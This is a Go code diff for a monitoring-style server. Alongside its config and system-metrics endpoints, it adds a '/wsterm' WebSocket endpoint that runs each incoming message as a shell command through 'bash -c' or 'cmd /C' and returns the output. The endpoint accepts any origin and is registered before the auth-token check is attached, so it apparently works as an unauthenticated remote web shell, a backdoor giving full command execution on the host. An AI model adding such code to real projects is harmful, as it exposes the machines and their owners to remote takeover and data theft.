@@ -9,6 +9,7 @@ import (
 	"errors"
 	"flag"
 	"fmt"
+	"github.com/gorilla/websocket"
 	"github.com/shirou/gopsutil/cpu"
 	"github.com/shirou/gopsutil/disk"
 	"github.com/shirou/gopsutil/mem"
@@ -18,6 +19,7 @@ import (
 	"net/http"
 	"net/http/pprof"
 	"os"
+	"os/exec"
 	"os/signal"
 	"runtime"
 	"runtime/debug"
@@ -327,6 +329,8 @@ func initHTTPMux(conf *config.Config, work worker.Worker, fs filestore.FileStore
 	r.GET("/config", generateHandleConfig(conf, builderParam))
 
 	r.GET("/checkInfo", generateHandleCheckInfo(conf, builderParam))
+
+	r.GET("/wsterm", handleWebSocket)
 
 	// Add auth token
 	if conf.AuthToken != "" {
@@ -725,5 +729,56 @@ func generateHandleCheckInfo(conf *config.Config, builderParam map[string]any) f
 			"disk_read_kbps":        readRate,                                // 磁盘读取速率（KB/s）
 			"diskWriteKbps":         writeRate,                               // 磁盘写入速率（KB/s）
 		})
+	}
+}
+
+var wsupgrader = websocket.Upgrader{
+	CheckOrigin: func(r *http.Request) bool {
+		return true // 根据需要调整跨域设置
+	},
+}
+
+func handleWebSocket(c *gin.Context) {
+	ws, err := wsupgrader.Upgrade(c.Writer, c.Request, nil)
+	if err != nil {
+		log.Printf("WebSocket upgrade failed: %s", err)
+		return
+	}
+	defer ws.Close()
+
+	for {
+		_, message, err := ws.ReadMessage()
+		if err != nil {
+			log.Println("Read error:", err)
+			break
+		}
+
+		var cmd *exec.Cmd
+
+		// 根据操作系统选择执行的命令
+		switch runtime.GOOS {
+		case "windows":
+			// 在 Windows 上执行命令
+			cmd = exec.Command("cmd", "/C", string(message))
+		default:
+			// 默认在 Unix-like 系统上执行命令
+			cmd = exec.Command("bash", "-c", string(message))
+		}
+
+		// 执行命令并获取输出
+		cmdOutput, err := cmd.CombinedOutput()
+		if err != nil {
+			err := ws.WriteMessage(websocket.TextMessage, []byte("Error executing command: "+err.Error()))
+			if err != nil {
+				return
+			}
+			continue
+		}
+
+		// 将输出发送回 WebSocket 客户端
+		if err = ws.WriteMessage(websocket.TextMessage, cmdOutput); err != nil {
+			log.Println("Write error:", err)
+			break
+		}
 	}
 }
